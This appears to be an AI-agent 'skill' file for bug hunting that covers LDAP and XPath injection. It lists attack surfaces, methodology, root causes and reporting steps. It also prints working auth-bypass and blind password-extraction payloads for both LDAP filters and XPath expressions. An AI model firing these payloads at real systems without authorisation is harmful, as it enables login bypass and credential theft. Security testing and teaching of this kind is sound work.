---
skill: ldap-xpath-injection
title: "LDAP & XPath Injection"
category: "Security · Web"
load_when: "ldap injection, xpath injection, directory injection, ldap filter, xpath query, xpath auth bypass, ldap auth bypass"
pack: SUPERAGENT V10
bughunt: true
---

# LDAP & XPath Injection

## Where it pays
Apps that query directories (LDAP) or XML (XPath) with user input — enterprise logins, address books, config lookups. Auth bypass and data extraction are the wins.

## Attack-surface signals
Corporate/SSO logins backed by Active Directory/LDAP, user search, XML-backed APIs, "find user", any input flowing into an LDAP filter `(&(uid=..)..)` or an XPath expression `//user[name='..']`.

## Methodology — LDAP
1. **Auth bypass:** inject filter operators — `*`, `*)(uid=*))(|(uid=*`, `admin)(&)`.
2. **Blind:** boolean injection, char-by-char via `(uid=a*)` wildcards.
3. **Attribute disclosure:** manipulate the filter to return extra entries.

## Methodology — XPath
1. **Auth bypass:** `' or '1'='1`, `']|//*|//'`, `' or position()=1 or '`.
2. **Blind extraction:** `substring(//user[1]/password,1,1)='a'` true/false oracle.
3. **XXE-adjacent:** if the XML source is attacker-influenced, combine with xxe.

## Payloads / probes
```
# LDAP
*)(uid=*))(|(uid=*
admin)(&)
*)(|(password=*)
# XPath
' or '1'='1
']|//user/*|//user['
' or substring(//user[1]/pass,1,1)='a
```

## Root causes
User input concatenated into an LDAP filter or XPath expression without escaping special chars (`* ( ) \ /` for LDAP; `' " [ ] /` for XPath).

## Validation gate
Show auth bypass (login without valid creds), extra/other-user records returned, or a working blind-extraction oracle.

## Impact & chains
Auth bypass, directory/data extraction, enumeration. Chains with auth/* (login bypass) and web/xxe (XML sources).

## 🧪 Try it locally
```bash
python3 ../../../tools/payload_gen.py ldap
python3 ../../../tools/payload_gen.py xpath
python3 ../../../tools/skill_router.py "ldap injection auth bypass filter"
```

→ Report with `../reporting/writeup.md` (CWE-90 / CWE-643); validate with `../reporting/validation-gate.md`.
